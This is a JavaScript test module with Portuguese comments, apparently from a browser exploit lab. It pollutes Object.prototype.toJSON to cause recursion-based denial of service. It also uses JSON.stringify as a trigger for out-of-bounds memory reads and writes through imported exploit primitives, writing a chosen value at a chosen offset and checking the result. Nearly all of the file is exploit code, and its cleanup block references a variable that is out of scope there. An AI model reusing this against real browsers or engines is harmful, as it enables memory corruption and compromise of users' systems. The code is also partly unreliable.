// js/json_exploit_test.mjs
import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { AdvancedInt64 } from './int64.mjs';
import { OOB_CONFIG, updateOOBConfigFromUI } from './config.mjs';


const FNAME_BASE_JSON = "JsonExploitTest";

// --- Função para Testes de DoS por Recursão ---
export async function runJsonRecursionTest(scenarioName) {
    const FNAME_RECURSION = `${FNAME_BASE_JSON}.runJsonRecursionTest[${scenarioName}]`;
    appLog(`--- Iniciando Teste de Recursão JSON: ${scenarioName} ---`, 'test', FNAME_RECURSION);
    updateOOBConfigFromUI(); // Garante configs OOB atualizadas se o teste as usar indiretamente

    let testObject;
    let recursionCount = 0;
    const MAX_RECURSION_DEPTH_TEST = 5; // Limite para o teste de DoS controlado

    // Guardar o descritor original de Object.prototype.toJSON
    const originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, "toJSON");
    let ppAppliedSuccessfully = false;

    try {
        Object.defineProperty(Object.prototype, "toJSON", {
            configurable: true,
            writable: true,
            value: function toJSON_DoS(...args) {
                recursionCount++;
                appLog(`toJSON_DoS invocado (${recursionCount}ª vez). this: ${this?.constructor?.name}`, 'info', `${FNAME_RECURSION}.toJSON_DoS`);

                if (recursionCount > MAX_RECURSION_DEPTH_TEST && scenarioName !== 'scenario_large_object_shallow' && scenarioName !== 'scenario_deep_object') {
                    appLog(`Limite de recursão do teste (${MAX_RECURSION_DEPTH_TEST}) atingido. Retornando para evitar DoS real.`, 'warn', `${FNAME_RECURSION}.toJSON_DoS`);
                    return { dos_recursion_limit_hit: true, count: recursionCount, final_this_type: typeof this };
                }

                let keySuffix = "";
                if (scenarioName === 'scenario_recursive_keys_long') {
                    keySuffix = "_VERY_LONG_KEY_SUFFIX_".repeat(10); // Chave mais longa
                }

                switch (scenarioName) {
                    case 'scenario_poc_v23s_corrected':
                        // Simula o comportamento que pode levar a estouro de pilha se não limitado.
                        // A lógica original deste PoC era complexa e específica.
                        // Aqui, vamos simular uma chamada que aprofunda a recursão.
                        if (this && typeof this === 'object' && !Array.isArray(this)) {
                            // Tenta chamar JSON.stringify em uma propriedade para forçar mais recursão.
                            // Evita recursão infinita direta se 'this' não mudar.
                            if (Object.keys(this).length > 0) {
                                const firstKey = Object.keys(this)[0];
                                return { [`processed_${firstKey}`]: JSON.parse(JSON.stringify(this[firstKey])) }; // Força nova serialização
                            }
                        }
                        return Object.assign({}, this, { [`recursive_call_${recursionCount}${keySuffix}`]: "value" });

                    case 'scenario_recursive_keys_short':
                    case 'scenario_recursive_keys_long':
                        // Causa recursão chamando Object.keys(this) dentro do toJSON.
                        // O Object.keys pode, em algumas implementações antigas ou específicas,
                        // invocar getOwnPropertyNames que por sua vez poderia re-chamar toJSON sob certas condições.
                        // Aqui, vamos simular um retorno que poderia ser problemático.
                        if (this && typeof this === 'object') {
                            return { ...Object.keys(this).reduce((acc, key) => ({ ...acc, [`key_${key}${keySuffix}`]: `val_${key}` }), {}), recursive_depth: recursionCount };
                        }
                        return { no_object_this: true, depth: recursionCount };

                    case 'scenario_large_object_shallow':
                        const largeObj = {};
                        for (let i = 0; i < 20000; i++) { // Muitas chaves
                            largeObj[`key_${i}`] = i;
                        }
                        return largeObj; // toJSON retorna o objeto grande para ser serializado

                    case 'scenario_deep_object':
                        let deepObj = {};
                        let current = deepObj;
                        for (let i = 0; i < 200; i++) { // Profundidade de 200
                            current.nested = {};
                            current = current.nested;
                        }
                        return deepObj; // toJSON retorna o objeto profundo
                    default:
                        appLog(`Cenário de recursão desconhecido: ${scenarioName}`, 'error', FNAME_RECURSION);
                        return { error: "unknown_scenario", scenario: scenarioName };
                }
            }
        });
        ppAppliedSuccessfully = true;
        appLog("Poluição Object.prototype.toJSON para Teste de DoS aplicada.", 'good', FNAME_RECURSION);

        // Definir o objeto de teste inicial
        if (scenarioName === 'scenario_poc_v23s_corrected') {
            testObject = { a: { b: { c: 123 } } }; // Objeto inicial para o PoC
        } else if (scenarioName.includes('keys')) {
            testObject = { prop1: "val1", prop2: "val2", prop3: "val3" };
        } else {
            testObject = { initial_trigger: true }; // Objeto simples para disparar os outros cenários
        }

        appLog(`Tentando JSON.stringify no objeto de teste...`, 'info', FNAME_RECURSION);
        await PAUSE_LAB(100);
        const resultJSON = JSON.stringify(testObject, null, 2);
        appLog(`JSON.stringify (Teste de DoS) CONCLUÍDO.`, 'good', FNAME_RECURSION);

        if (resultJSON && resultJSON.length < 2000) appLog(resultJSON, 'info', FNAME_RECURSION);
        else if (resultJSON) appLog(`(Resultado JSON Teste de DoS muito longo: ${resultJSON.length} chars)`, 'info', FNAME_RECURSION);
        else appLog("Resultado JSON foi nulo ou indefinido.", "warn", FNAME_RECURSION);


    } catch (e) {
        appLog(`Erro durante Teste de Recursão JSON (${scenarioName}): ${e.name} - ${e.message}`, 'error', FNAME_RECURSION);
        if (e.name === 'RangeError' && e.message.toLowerCase().includes('stack size exceeded')) {
            appLog("   SUCESSO (Controlado): Estouro de pilha detectado como esperado!", "vuln", FNAME_RECURSION);
        }
        console.error(`Erro Teste Recursão JSON (${scenarioName}):`, e);
    } finally {
        recursionCount = 0; // Reset para o próximo teste
        if (ppAppliedSuccessfully && originalToJSON_Descriptor) {
            Object.defineProperty(Object.prototype, "toJSON", originalToJSON_Descriptor);
            appLog("Object.prototype.toJSON restaurado.", 'info', `${FNAME_RECURSION}.Cleanup`);
        } else if (ppAppliedSuccessfully && !originalToJSON_Descriptor) {
            // Se não havia original, deleta o que foi adicionado
            delete Object.prototype.toJSON;
            appLog("Object.prototype.toJSON removido (não havia original).", 'info', `${FNAME_RECURSION}.Cleanup`);
        }
    }
    appLog(`--- Teste de Recursão JSON: ${scenarioName} Concluído ---`, 'test', FNAME_RECURSION);
}


// --- Função para JSON como Gatilho OOB ---
export async function jsonTriggeredOOBInteraction(targetTypeStr, relativeOffsetInt, valueToWriteHexStr, bytesToReadInt) {
    const FNAME_OOB_TRIGGER = `${FNAME_BASE_JSON}.jsonTriggeredOOBInteraction`;
    appLog(`--- Iniciando Cenário: JSON como Gatilho para Interação OOB ---`, 'test', FNAME_OOB_TRIGGER);
    updateOOBConfigFromUI(); // Garante configs OOB atualizadas

    let objectToPassToJSON;
    let targetDescription;

    // Preparar o objeto alvo para JSON.stringify
    if (targetTypeStr === "new_array_buffer") {
        objectToPassToJSON = new ArrayBuffer(128); // Objeto simples para teste
        targetDescription = `Novo ArrayBuffer(${objectToPassToJSON.byteLength})`;
    } else if (targetTypeStr === "core_oob_buffer") {
        if (!Core.oob_array_buffer_real) {
            appLog("   AVISO: Core.oob_array_buffer_real não está ativo. Tentando ativar...", 'warn', FNAME_OOB_TRIGGER);
            await Core.triggerOOB_primitive();
            if (!Core.oob_array_buffer_real) {
                appLog("   ERRO: Falha ao ativar Core.oob_array_buffer_real. Abortando gatilho JSON OOB.", 'error', FNAME_OOB_TRIGGER);
                return;
            }
        }
        objectToPassToJSON = Core.oob_array_buffer_real;
        targetDescription = `Core.oob_array_buffer_real (${objectToPassToJSON.byteLength} bytes)`;
    } else {
        appLog(`   ERRO: Tipo de alvo desconhecido para gatilho JSON OOB: ${targetTypeStr}`, 'error', FNAME_OOB_TRIGGER);
        return;
    }
    appLog(`   Alvo para JSON.stringify: ${targetDescription}`, 'info', FNAME_OOB_TRIGGER);

    // Validar e parsear valor de escrita
    let valueToWriteNum;
    if (valueToWriteHexStr && valueToWriteHexStr.toLowerCase().startsWith("0x")) {
        valueToWriteNum = parseInt(valueToWriteHexStr, 16);
    } else {
        valueToWriteNum = parseInt(valueToWriteHexStr, 10);
    }
    if (isNaN(valueToWriteNum)) {
        appLog(`   AVISO: Valor para escrita OOB '${valueToWriteHexStr}' é inválido. Usando 0xDEADBEEF como padrão.`, 'warn', FNAME_OOB_TRIGGER);
        valueToWriteNum = 0xDEADBEEF; // Padrão se inválido
    }

    appLog(`   Offset OOB Relativo (no Core.oob_dataview_real): ${relativeOffsetInt} (${toHexS1(relativeOffsetInt)})`, 'info', FNAME_OOB_TRIGGER);
    appLog(`   Valor para Escrita OOB: ${toHexS1(valueToWriteNum)}`, 'info', FNAME_OOB_TRIGGER);
    appLog(`   Bytes para Leitura OOB: ${bytesToReadInt}`, 'info', FNAME_OOB_TRIGGER);

    const originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, "toJSON");
    let ppAppliedSuccessfully = false;
    let resultJSON = null;
    let oobInteractionResult = {
        oob_trigger_executed: false,
        offset_tested: relativeOffsetInt,
        initial_val_read: "N/A",
        written_val_if_any: "N/A",
        read_back_val_after_write: "N/A",
        write_confirmed: false,
        error: null
    };

    try {
        if (!Core.oob_array_buffer_real) { // Verifica novamente se o core_exploit está pronto
             appLog("   ERRO CRÍTICO: Primitiva OOB (Core.oob_array_buffer_real) não está ativa antes da poluição. Abortando.", 'error', FNAME_OOB_TRIGGER);
            return;
        }

        const ppKey = "toJSON";
        Object.defineProperty(Object.prototype, ppKey, {
            configurable: true,
            writable: true,
            value: function toJSON_OOBTrigger() { // Não use arrow function aqui para ter 'this' dinâmico
                // Só executa a lógica OOB se 'this' for o objeto que realmente queremos alvejar
                // com a poluição.
                if (this === objectToPassToJSON) {
                    appLog(`   toJSON_OOBTrigger: 'this' (${this?.constructor?.name}, Tam: ${this?.byteLength}) é o objeto alvo! Executando OOB...`, 'vuln', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                    oobInteractionResult.oob_trigger_executed = true;
                    try {
                        // 1. Leitura OOB Inicial
                        const initial_val = Core.oob_read_relative(relativeOffsetInt, bytesToReadInt);
                        oobInteractionResult.initial_val_read = (initial_val instanceof AdvancedInt64) ? initial_val.toString(true) : toHexS1(initial_val, bytesToReadInt * 8);
                        appLog(`     toJSON_OOBTrigger - Valor OOB ${bytesToReadInt}-byte lido em offset ${relativeOffsetInt}: ${oobInteractionResult.initial_val_read}`, 'leak', `${FNAME_OOB_TRIGGER}.${ppKey}`);

                        // 2. Escrita OOB
                        appLog(`     toJSON_OOBTrigger - Escrevendo ${toHexS1(valueToWriteNum)} em offset ${relativeOffsetInt} (${bytesToReadInt} bytes)...`, 'vuln', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        Core.oob_write_relative(relativeOffsetInt, valueToWriteNum, bytesToReadInt); // Assumindo que o valor é para 4 bytes se não for Int64
                        oobInteractionResult.written_val_if_any = toHexS1(valueToWriteNum, bytesToReadInt * 8);
                        appLog(`     toJSON_OOBTrigger - Escrita OOB realizada.`, 'good', `${FNAME_OOB_TRIGGER}.${ppKey}`);

                        // 3. Leitura OOB Pós-Escrita para Confirmação
                        const read_back_val = Core.oob_read_relative(relativeOffsetInt, bytesToReadInt);
                        oobInteractionResult.read_back_val_after_write = (read_back_val instanceof AdvancedInt64) ? read_back_val.toString(true) : toHexS1(read_back_val, bytesToReadInt * 8);
                        appLog(`     toJSON_OOBTrigger - Valor OOB lido em offset ${relativeOffsetInt} APÓS escrita: ${oobInteractionResult.read_back_val_after_write}`, 'leak', `${FNAME_OOB_TRIGGER}.${ppKey}`);

                        let written_val_for_compare;
                        if (bytesToReadInt === 8) { // Compara como Int64
                            written_val_for_compare = new AdvancedInt64(valueToWriteNum, 0); // Assumindo que valueToWriteNum é a parte baixa se for número simples
                            if (valueToWriteNum instanceof AdvancedInt64) written_val_for_compare = valueToWriteNum;
                            oobInteractionResult.write_confirmed = read_back_val && read_back_val.equals(written_val_for_compare);
                        } else { // Compara como número
                            written_val_for_compare = valueToWriteNum;
                             // Aplica máscara para o número de bytes, especialmente para escritas < 4 bytes
                            if (bytesToReadInt === 1) written_val_for_compare &= 0xFF;
                            else if (bytesToReadInt === 2) written_val_for_compare &= 0xFFFF;
                            oobInteractionResult.write_confirmed = (read_back_val === written_val_for_compare);
                        }

                        if (oobInteractionResult.write_confirmed) {
                            appLog(`     toJSON_OOBTrigger - SUCESSO: Leitura após escrita OOB confirmou o valor!`, 'good', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        } else {
                            appLog(`     toJSON_OOBTrigger - FALHA: Leitura após escrita (${oobInteractionResult.read_back_val_after_write}) não corresponde ao valor escrito (${toHexS1(written_val_for_compare, bytesToReadInt * 8)}).`, 'error', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        }

                    } catch (e_oob) {
                        appLog(`     toJSON_OOBTrigger - ERRO durante interação OOB: ${e_oob.message}`, 'error', `${FNAME_OOB_TRIGGER}.${ppKey}`);
                        oobInteractionResult.error = e_oob.message;
                        console.error("Erro na lógica OOB dentro de toJSON:", e_oob);
                    }
                    // O que toJSON retorna aqui afetará o resultado final de JSON.stringify
                    return oobInteractionResult; // Retorna o resultado da interação OOB
                }
                // Se 'this' não for o objeto alvo, chama o toJSON original se existir, ou um fallback.
                if (originalToJSON_Descriptor && typeof originalToJSON_Descriptor.value === 'function') {
                    return originalToJSON_Descriptor.value.call(this);
                }
                return { processed_by_fallback_toJSON: true, this_type: typeof this, constructor_name: this?.constructor?.name };
            }
        });
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.${ppKey} para Gatilho OOB aplicada.`, 'good', FNAME_OOB_TRIGGER);

        appLog(`Tentando JSON.stringify em ${targetDescription}...`, 'info', FNAME_OOB_TRIGGER);
        await PAUSE_LAB(100);
        resultJSON = JSON.stringify(objectToPassToJSON, null, 2);
        
        appLog(`JSON.stringify (Gatilho OOB) CONCLUÍDO.`, 'good', FNAME_OOB_TRIGGER);
        if (resultJSON && resultJSON.length < 2000) appLog(resultJSON, 'info', FNAME_OOB_TRIGGER);
        else if (resultJSON) appLog(`(Resultado JSON Gatilho OOB muito longo: ${resultJSON.length} chars)`, 'info', FNAME_OOB_TRIGGER);
        else appLog("Resultado JSON foi nulo ou indefinido.", "warn", FNAME_OOB_TRIGGER);


    } catch (e) {
        oobInteractionResult.error = e.message;
        appLog(`Erro fatal durante Gatilho OOB via JSON: ${e.name} - ${e.message}`, 'error', FNAME_OOB_TRIGGER);
        console.error("Erro Gatilho OOB via JSON:", e);
    } finally {
        if (ppAppliedSuccessfully) { 
            if (originalToJSON_Descriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
                appLog(`Object.prototype.${ppKey} restaurado.`, 'info', `${FNAME_OOB_TRIGGER}.Cleanup`);
            } else {
                delete Object.prototype[ppKey];
                appLog(`Object.prototype.${ppKey} removido (não havia original).`, 'info', `${FNAME_OOB_TRIGGER}.Cleanup`);
            }
        }
    }
    appLog(`--- Cenário: JSON como Gatilho OOB Concluído ---`, 'test', FNAME_OOB_TRIGGER);
}
